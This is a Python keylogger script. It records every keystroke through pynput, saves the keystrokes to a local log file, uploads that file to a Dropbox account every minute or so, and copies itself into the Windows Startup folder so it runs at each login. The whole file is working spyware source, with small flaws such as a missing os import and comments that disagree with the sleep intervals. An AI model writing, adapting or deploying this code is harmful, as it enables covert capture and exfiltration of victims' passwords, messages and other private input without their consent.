import re
import threading
import shutil
import time
from pynput import keyboard
import dropbox

# Global variable to store keystrokes
log = []
log_lock = threading.Lock()

def on_press(key):
    global log
    try:
        log.append(key.char)
    except AttributeError:
        if hasattr(key, 'name'):
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '\n',
                keyboard.Key.backspace: '[BACKSPACE]'
            }
            if key in special_keys:
                log.append(special_keys[key])

def on_release(key):
    if key in (keyboard.Key.ctrl, keyboard.Key.shift):
        special_keys = {
            keyboard.Key.ctrl: '[CTRL]',
            keyboard.Key.shift: '[SHIFT]'
        }
        log.append(special_keys[key])
    if key == keyboard.Key.esc:
        return False

def preprocess_text(text):
    text = re.sub(r'\[BACKSPACE\]', ' ', text)
    text = re.sub(r'\[ENTER\]', '\n', text)
    text = re.sub(r'\[CTRL\]', ' ', text)
    text = re.sub(r'\[SHIFT\]', ' ', text)
    tokens = re.findall(r'\w+', text)
    return tokens

def send_log():
    try:
        dbx = dropbox.Dropbox('')  # Replace with your Dropbox access token
        with open('log.txt', 'rb') as doc:
            dbx.files_upload(doc.read(), '/log.txt', mode=dropbox.files.WriteMode('overwrite'))
        print(f'Log uploaded to Dropbox successfully.')

        # Clear the file after sending
        open('log.txt', 'w').close()  # Clear the file
    except dropbox.exceptions.AuthError as e:
        print(f'Error authenticating with Dropbox: {e}')
    except dropbox.exceptions.ApiError as e:
        print(f'Error interacting with Dropbox API: {e}')
    except Exception as e:
        print(f'Unexpected error: {e}')

def save_log():
    global log
    while True:
        time.sleep(30)  # Sleep for 10 seconds
        with log_lock:
            if log:
                keystrokes_text = ''.join(log)
                preprocessed_keystrokes = preprocess_text(keystrokes_text)
                with open('log.txt', 'a') as log_file:
                    log_file.write(' '.join(preprocessed_keystrokes))
                log.clear()
                print("Saved log to file.")

def add_to_startup():
    startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
                                  "Programs", "Startup")
    script_path = os.path.abspath(__file__)
    if os.path.isfile(os.path.join(startup_folder, "keylogger.py")):
        print("Script is already set to run on startup.")
    else:
        try:
            shutil.copy(script_path, startup_folder)
            print("Script added to startup.")
        except Exception as e:
            print(f"Error adding script to startup: {e}")

def main():
    add_to_startup()
    threading.Thread(target=save_log, daemon=True).start()
    threading.Thread(target=send_logs_periodically, daemon=True).start()
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()

def send_logs_periodically():
    while True:
        time.sleep(61)  # Sleep for 30 minutes (adjust as needed)
        send_log()

if __name__ == '__main__':
    main()
